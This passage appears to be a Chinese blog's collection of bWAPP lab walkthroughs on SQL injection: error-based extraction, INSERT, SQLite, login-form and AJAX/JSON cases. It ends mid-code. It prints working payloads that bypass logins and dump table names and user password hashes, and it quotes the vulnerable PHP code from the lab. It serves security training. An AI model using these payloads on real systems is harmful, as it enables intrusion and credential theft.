<h2 id="函数解释"><a href="#函数解释" class="headerlink" title="函数解释"></a>函数解释</h2><p>　　extractvalue()：从目标XML中返回包含所查询值的字符串。<br>　　EXTRACTVALUE (XML_document, XPath_string);<br>　　第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>　　第二个参数：XPath_string (Xpath格式的字符串)</p>
<p><strong>第二个参数 xml中的位置是可操作的地方</strong>，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，<strong>并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容</strong></p>
<p>正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--正常查询，无报错</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="literal">null</span>,<span class="string">'/x/xx'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">--非正常查询</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="literal">null</span>,<span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()))))</span><br><span class="line"></span><br><span class="line"><span class="comment">--结果 为执行database()函数并返回数据库名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--其中 concat的第一个参数为 ~的目的是因为以~开头的内容不是正确的xml命名规则的语法,所以导致报错，从而执行database()</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#XML元素的命名规则</span></span><br><span class="line">1、元素的名字可以包含字母、数字、和其他字符</span><br><span class="line"></span><br><span class="line">2、元素的名字不能以xml（XML、Xml、xML等）开头</span><br><span class="line"></span><br><span class="line">3、元素的名字不能以数字或者标点符号开头</span><br><span class="line"></span><br><span class="line">4、元素的名字不能包含空格</span><br><span class="line"></span><br><span class="line">5、XML文档除了XML以外，没有其他所谓的保留字，任何的名字都可以使用，但是应该尽量使元素名字具有可读性，名字使用下划线是个不错的选择</span><br><span class="line"></span><br><span class="line">6、尽量避免使用<span class="string">"-"</span>和<span class="string">"."</span>，因为可能引起混乱。</span><br><span class="line"></span><br><span class="line">7、在XML元素命名中不要使用”:”,因为XML命名空间需要用到这个十分特殊的字符。</span><br></pre></td></tr></table></figure>

<h1 id="updatexml-用法"><a href="#updatexml-用法" class="headerlink" title="updatexml()用法"></a>updatexml()用法</h1><h2 id="函数解释-1"><a href="#函数解释-1" class="headerlink" title="函数解释"></a>函数解释</h2><p>updatexml(XML_document, XPath_string, string)</p>
<p>​                        目标xml文档，xml路径，更新的内容</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="string">'anything'</span>,<span class="string">'/xx/xx'</span>,<span class="string">'anything'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="string">'anything'</span>,<span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="string">'anything'</span>))</span><br></pre></td></tr></table></figure>

<p>需要注意，extractvalue()和updatexml()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="literal">null</span>,<span class="keyword">concat</span>(<span class="string">'~'</span>,<span class="keyword">substring</span>(<span class="keyword">hex</span>((<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="number">1</span>,<span class="number">5</span>))))</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="string">'anything'</span>,<span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="string">'anything'</span>))</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036" target="_blank" rel="noopener">extractvalue()/updatexml()</a></p>
<p><a href="https://www.jianshu.com/p/361a2cb6d3e5" target="_blank" rel="noopener">XML语法</a></p>
<p><a href="https://www.w3school.com.cn/dtd/index.asp" target="_blank" rel="noopener">DTD</a></p>
]]></content>
  </entry>
  <entry>
    <title>bWAPP-SQLiInsert</title>
    <url>/2020/09/22/bWAPP-SQLiInsert/</url>
    <content><![CDATA[<h1 id="SQL-Insert注入"><a href="#SQL-Insert注入" class="headerlink" title="SQL Insert注入"></a>SQL Insert注入</h1><h2 id="bwapp-bolg"><a href="#bwapp-bolg" class="headerlink" title="bwapp-bolg"></a>bwapp-bolg</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$entry = sqli($_POST[<span class="string">"entry"</span>]);</span><br><span class="line">$owner = $_SESSION[<span class="string">"login"</span>];</span><br><span class="line">$sql = <span class="string">"INSERT INTO blog (date, entry, owner) VALUES (now(),'"</span> . $entry . <span class="string">"','"</span> . $owner . <span class="string">"')"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//故执行了 insert into blog(date,entry,owner) values(now(), '$entry', 'bee'); sql语句</span></span><br><span class="line"><span class="comment">//所以对（）进行闭合即可</span></span><br></pre></td></tr></table></figure>



<h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><ol>
<li><p>注入判断</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">'</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922153652885.png" alt="image-20200922153652885"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">entry','owner')<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922154017997.png" alt="image-20200922154017997"></p>
</li>
<li><p>联合查询</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">entry',(<span class="keyword">select</span> <span class="keyword">database</span>()))<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922154216830.png" alt="image-20200922154216830"></p>
</li>
<li><p>获取表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">entry',(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()))<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922154418666.png" alt="image-20200922154418666"></p>
</li>
<li><p>获取列名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">entry',(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"users"</span> <span class="keyword">and</span> table_schema=<span class="keyword">database</span>()))<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922154533356.png" alt="image-20200922154533356"></p>
</li>
<li><p>提取信息</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">entry',(<span class="keyword">select</span> <span class="keyword">group_concat</span>(login,<span class="string">'-'</span>,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922154641987.png" alt="image-20200922154641987"></p>
<h3 id="mid"><a href="#mid" class="headerlink" title="mid"></a>mid</h3><p>使用 <code>addslashes</code>对输入的特殊字符进行转义（这些字符是单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）。）</p>
<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922154855945.png" alt="image-20200922154855945"></p>
</li>
</ol>
<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>使用 <code>mysqli_real_escape_string</code>对字符串中的特殊字符进行转义， 以使得这个字符串是一个合法的 SQL 语句</p>
<h2 id="bwapp–User-Agent"><a href="#bwapp–User-Agent" class="headerlink" title="bwapp–User-Agent"></a>bwapp–User-Agent</h2><h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取客户端user_agent，插入数据库并回显</span></span><br><span class="line">$ip_address = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">$user_agent = $_SERVER[<span class="string">"HTTP_USER_AGENT"</span>];</span><br><span class="line"><span class="comment">// Writes the entry into the database</span></span><br><span class="line">$sql = <span class="string">"INSERT INTO visitors (date, user_agent, ip_address) VALUES (now(), '"</span> . sqli($user_agent) . <span class="string">"', '"</span> . $ip_address . <span class="string">"')"</span>;  </span><br><span class="line">$recordset = $link-&gt;query($sql);</span><br></pre></td></tr></table></figure>

<h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922155906295.png" alt="image-20200922155906295"></p>
<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922155924071.png" alt="image-20200922155924071"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">entry',(<span class="keyword">select</span> <span class="keyword">group_concat</span>(login,<span class="string">'-'</span>,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922160147861.png" alt="image-20200922160147861"></p>
<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922160215133.png" alt="image-20200922160215133"></p>
<h3 id="mid-high"><a href="#mid-high" class="headerlink" title="mid/high"></a>mid/high</h3><p>分别使用了 <code>addslashes（）</code>和 <code>mysqli_real_escape_string（）</code>对数据进行消毒</p>
]]></content>
  </entry>
  <entry>
    <title>bWAPP-SQLInjectionSQLite</title>
    <url>/2020/09/22/bWAPP-SQLInjectionSQLite/</url>
    <content><![CDATA[<h1 id="SQLlite注入"><a href="#SQLlite注入" class="headerlink" title="SQLlite注入"></a>SQLlite注入</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="常用语句及基本结构"><a href="#常用语句及基本结构" class="headerlink" title="常用语句及基本结构"></a>常用语句及基本结构</h3><p>sqlite因为其比较简易每个db文件就是一个数据库，所以不存在information_schema数据库，但存在类似作用的表<code>sqlite_master</code>。 该表记录了该库下的所有表，索引，表的创建sql等所以我们可以通过此读取数据。</p>
<p><strong>SQLite含有一张内置表“sqlite_master”,表里存储着type、name、tbl_name、rootpage、sql五个字段。</strong></p>
<p><strong>type列记录了项目的类型，如table、index、view、trigger</strong></p>
<p><strong>tbl_name字段记录所从属的表名，如索引所在的表名。对于表来说，该列就是表名本身；</strong></p>
<p><strong>name字段记录了项目的名称，如表名、索引名等；</strong></p>
<p><strong>rootpage记录项目在数据库页中存储的编号。对于视图和触发器，该列值为0或者NULL</strong></p>
<p><strong>sql存放着所有表的创建语句，即表的结构。</strong></p>
<p><a href="https://www.cnblogs.com/kagari/p/11631085.html" target="_blank" rel="noopener">SQLite</a></p>
<h2 id="常规流程"><a href="#常规流程" class="headerlink" title="常规流程"></a>常规流程</h2><ol>
<li><p>判断注入点</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' and 1=1 <span class="comment">--</span></span><br></pre></td></tr></table></figure>



</li>
</ol>
<ol start="2">
<li><p>判断字段数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' order by 6 <span class="comment">--</span></span><br></pre></td></tr></table></figure>



</li>
</ol>
<ol start="3">
<li><p>判断字段显示顺序</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>爆所有表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,sqlite_version(),<span class="keyword">name</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">from</span> sqlite_master <span class="comment">--</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>获取字段</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,sqlite_version(),<span class="keyword">sql</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">from</span> sqlite_master <span class="comment">--</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>获取信息</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,login,<span class="keyword">password</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>





</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>bWAPP-SQLInjection-LoginForm</title>
    <url>/2020/09/21/bWAPP-SQLInjection-LoginForm/</url>
    <content><![CDATA[<h1 id="表单注入"><a href="#表单注入" class="headerlink" title="表单注入"></a>表单注入</h1><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//==============同时对输入字段进行消毒，查询================</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"form"</span>]))   <span class="comment">//===========获取提交的表单信息===============</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $login = $_POST[<span class="string">"login"</span>];</span><br><span class="line">        $login = sqli($login);</span><br><span class="line"></span><br><span class="line">        $password = $_POST[<span class="string">"password"</span>];</span><br><span class="line">        $password = sqli($password);</span><br><span class="line">		<span class="comment">//==================使用自定义的sqli()函数进行消毒================</span></span><br><span class="line">        $sql = <span class="string">"SELECT * FROM heroes WHERE login = '"</span> . $login . <span class="string">"' AND password = '"</span> . $password . <span class="string">"'"</span>;</span><br><span class="line">        <span class="comment">// echo $sql;</span></span><br><span class="line">       $recordset = mysql_query($sql, $link);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="演练"><a href="#演练" class="headerlink" title="演练"></a>演练</h2><h1 id="Login-Form-Hero–low"><a href="#Login-Form-Hero–low" class="headerlink" title="Login Form/Hero–low"></a>Login Form/Hero–low</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">bee 'or 1=1<span class="comment">#</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/21/bWAPP-SQLInjection-LoginForm/image-20200921203846824.png" alt="image-20200921203846824"></p>
<h1 id="Login-Form-Hero–mid-high"><a href="#Login-Form-Hero–mid-high" class="headerlink" title="Login Form/Hero–mid/high"></a>Login Form/Hero–mid/high</h1><p>使用 addslashes(),mysql_real_escape_string() 无法绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli_check_1</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">    <span class="comment">// 语法 addslashes ( string $str ) : string</span></span><br><span class="line">    <span class="comment">// 返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。</span></span><br><span class="line">    <span class="comment">// 这些字符是单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符）。</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli_check_2</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mysql_real_escape_string($data);</span><br><span class="line">    <span class="comment">// 面向对象风格</span></span><br><span class="line">    <span class="comment">// mysqli::escape_string ( string $escapestr ) : string</span></span><br><span class="line">    <span class="comment">// mysqli::real_escape_string ( string $escapestr ) : string</span></span><br><span class="line">    <span class="comment">// 过程化风格</span></span><br><span class="line">    <span class="comment">// mysqli_real_escape_string ( mysqli $link , string $escapestr ) : string</span></span><br><span class="line">    <span class="comment">// 此函数用来对字符串中的特殊字符进行转义， 以使得这个字符串是一个合法的 SQL 语句。</span></span><br><span class="line">    <span class="comment">// 传入的字符串会根据当前连接的字符集进行转义，得到一个编码后的合法的 SQL 语句。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Login-Form-User–low"><a href="#Login-Form-User–low" class="headerlink" title="Login Form/User–low"></a>Login Form/User–low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//==先通过用户名查询用户信息(如果存在)，就提取出查到的信息中的用户密码，再与用户输入的密码进行匹配==</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"form"</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $login = $_POST[<span class="string">"login"</span>];</span><br><span class="line">        $login = sqli($login);</span><br><span class="line">        $password = $_POST[<span class="string">"password"</span>];</span><br><span class="line">        $password = sqli($password);</span><br><span class="line">        $password = hash(<span class="string">"sha1"</span>, $password, <span class="keyword">false</span>);</span><br><span class="line">   		<span class="comment">//=============hash加密，方便与后面获取的密码进行匹配比对=======</span></span><br><span class="line">        $sql = <span class="string">"SELECT * FROM users WHERE login = '"</span> . $login . <span class="string">"'"</span>;</span><br><span class="line">        $recordset = mysql_query($sql, $link);  </span><br><span class="line">        <span class="keyword">if</span>(!$recordset)					<span class="comment">//===========先判断用户是否存在</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Error: "</span> . mysql_error());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $row = mysql_fetch_array($recordset); </span><br><span class="line">            </span><br><span class="line"><span class="comment">//==========！！！逐行获取查询获得到的信息，row位数组，通过字段下标获取值，进行匹配！！！========</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>($row[<span class="string">"login"</span>] &amp;&amp; $password == $row[<span class="string">"password"</span>]) <span class="comment">//====用户名，密码匹配</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// $message = "&lt;font color=\"green\"&gt;Welcome " . ucwords($row["login"]) . "...&lt;/font&gt;";</span></span><br><span class="line">                $message =  <span class="string">"&lt;p&gt;Welcome &lt;b&gt;"</span> . ucwords($row[<span class="string">"login"</span>]) . <span class="string">"&lt;/b&gt;, how are you today?&lt;/p&gt;&lt;p&gt;Your secret: &lt;b&gt;"</span> . ucwords($row[<span class="string">"secret"</span>]) . <span class="string">"&lt;/b&gt;&lt;/p&gt;"</span>;</span><br><span class="line">                <span class="comment">// $message = $row["login"];</span></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                $message = <span class="string">"&lt;font color=\"red\"&gt;Invalid credentials!&lt;/font&gt;"</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mysql_close($link);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $message;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>因为对密码进行的hash加密，使得输入的密码会被编码位字符串，无法获得注入效果</strong></p>
<p><strong>发现存在<code>$sql = &quot;SELECT * FROM users WHERE login = &#39;&quot; . $login . &quot;&#39;&quot;;</code>语句，可以使用union 进行联合查询</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span> <span class="comment">#</span></span><br><span class="line"><span class="string">' union select 1,2,3,4,5,6,7,8,9 #</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/21/bWAPP-SQLInjection-LoginForm/image-20200921211125084.png" alt="image-20200921211125084"></p>
<p><img src="/2020/09/21/bWAPP-SQLInjection-LoginForm/image-20200921211139891.png" alt="image-20200921211139891"></p>
<p><strong>此处得知道password 字段的在可利用字段的位置</strong>（此处为位置3）</p>
<p>==注意此处的sha1加密的字符串必须为填入的密码的加密结果==</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">"6885858486f31043e5839c735d99457f045affd0"</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span> <span class="comment"># </span></span><br><span class="line">bug</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/21/bWAPP-SQLInjection-LoginForm/image-20200921211757686.png" alt="image-20200921211757686"></p>
<p><a href="http://www.ttmd5.com/hash.php?type=5" target="_blank" rel="noopener">sha1在线加密</a></p>
<ol>
<li>获取表名</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">"6885858486f31043e5839c735d99457f045affd0"</span>,<span class="number">4</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span> <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">bug</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/21/bWAPP-SQLInjection-LoginForm/image-20200921212345988.png" alt="image-20200921212345988"></p>
<ol start="2">
<li><p>获取列名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">"6885858486f31043e5839c735d99457f045affd0"</span>,<span class="number">4</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"users"</span> <span class="keyword">and</span> table_schema=<span class="keyword">database</span>()),<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span> <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">bug</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/21/bWAPP-SQLInjection-LoginForm/image-20200921212616925.png" alt="image-20200921212616925"></p>
</li>
<li><p>获取信息</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">"6885858486f31043e5839c735d99457f045affd0"</span>,<span class="number">4</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(login,<span class="string">'-'</span>,<span class="keyword">password</span>,<span class="string">'-'</span>) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span> <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">bug</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/21/bWAPP-SQLInjection-LoginForm/image-20200921212753561.png" alt="image-20200921212753561"></p>
</li>
</ol>
<h3 id="Login-Form-User–mid-high"><a href="#Login-Form-User–mid-high" class="headerlink" title="Login Form/User–mid/high"></a>Login Form/User–mid/high</h3><p>分别用了addslashes()和mysql_real_escape_string()函数防御,</p>
<p>且在mysql编码为utf-8, 无法用宽字节绕过, 安全。</p>
]]></content>
  </entry>
  <entry>
    <title>bWAPP-SQLInjection-AJAXJSONjQuery</title>
    <url>/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/</url>
    <content><![CDATA[<h1 id="AJAX-JSON-jQuery注入"><a href="#AJAX-JSON-jQuery注入" class="headerlink" title="AJAX/JSON/jQuery注入"></a>AJAX/JSON/jQuery注入</h1><h2 id="常规流程"><a href="#常规流程" class="headerlink" title="常规流程"></a>常规流程</h2><p><strong>1.判断是否存在注入，注入是字符型还是整数型</strong></p>
<p><strong>2.猜解SQL查询语句中的字段数 (order by )</strong></p>
<p><strong>3.确定显示的字段顺序</strong> </p>
<p><strong>4.获取当前数据库 (爆库)</strong></p>
<p><strong>5.获取数据库中的表 (爆表)</strong></p>
<p><strong>6.获取表中的字段名 (爆字段)</strong></p>
<p><strong>7.下载数据 (爆数据)</strong></p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="什么是AJAX-JSON-jQuery"><a href="#什么是AJAX-JSON-jQuery" class="headerlink" title="什么是AJAX/JSON/jQuery"></a>什么是AJAX/JSON/jQuery</h3><p>通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行实时更新。</p>
<p><a href="https://blog.csdn.net/cainiao_00001/article/details/82888692" target="_blank" rel="noopener">AJAX/JSON/jQuery</a></p>
<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sqli_10-1.php</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line">        $(<span class="string">"#title"</span>).keyup(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;                <span class="comment">// #title为表格的ID值</span></span><br><span class="line">            <span class="comment">// Searches for a movie title</span></span><br><span class="line">            <span class="keyword">var</span> search = &#123;<span class="attr">title</span>: $(<span class="string">"#title"</span>).val()&#125;; <span class="comment">//获取输入的值，制成JSON格式</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// AJAX call</span></span><br><span class="line">        	<span class="comment">//getJSON(url,data,success(data,status,xhr))</span></span><br><span class="line">            $.getJSON(<span class="string">"sqli_10-2.php"</span>, search, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123; <span class="comment">//data 接收返回的数据</span></span><br><span class="line">                init_table();								 <span class="comment">//初始化表头</span></span><br><span class="line">                <span class="comment">// Constructs the table from the JSON data</span></span><br><span class="line">                <span class="keyword">var</span> total = <span class="number">0</span>;</span><br><span class="line">                $.each(data, <span class="function"><span class="keyword">function</span>(<span class="params">key, val</span>)</span>&#123;			<span class="comment">//循环输出JSON数据，制成表格</span></span><br><span class="line">                    total++;</span><br><span class="line">                    $(<span class="string">"#table_yellow tr:last"</span>).after(<span class="string">"&lt;tr&gt;&lt;td&gt;"</span> + val.title + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;"</span> + val.release_year + <span class="string">"&lt;/td&gt;&lt;td&gt;"</span> + val.main_character + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;"</span> + val.genre + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;&lt;a href='http://www.imdb.com/title/"</span> + val.imdb + <span class="string">"' target='_blank'&gt;Link&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;"</span>);</span><br><span class="line">                &#125;);</span><br><span class="line">                <span class="comment">// Empty result</span></span><br><span class="line">                <span class="keyword">if</span> (total == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    $(<span class="string">"#table_yellow tr:last"</span>).after(<span class="string">"&lt;tr height='30'&gt;&lt;td colspan='5' width='580'&gt;No movies were found!&lt;/td&gt;&lt;/tr&gt;"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//"sqli_10-2.php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="string">"title"</span>]))    <span class="comment">//接收数据，并使用自定义函数sqli()对数据进行消毒</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Retrieves the movie title</span></span><br><span class="line">    $title = $_GET[<span class="string">"title"</span>];</span><br><span class="line">    <span class="comment">// Constructs the query</span></span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line">    <span class="comment">// Queries the database</span></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="comment">// Fetches the result</span></span><br><span class="line">    <span 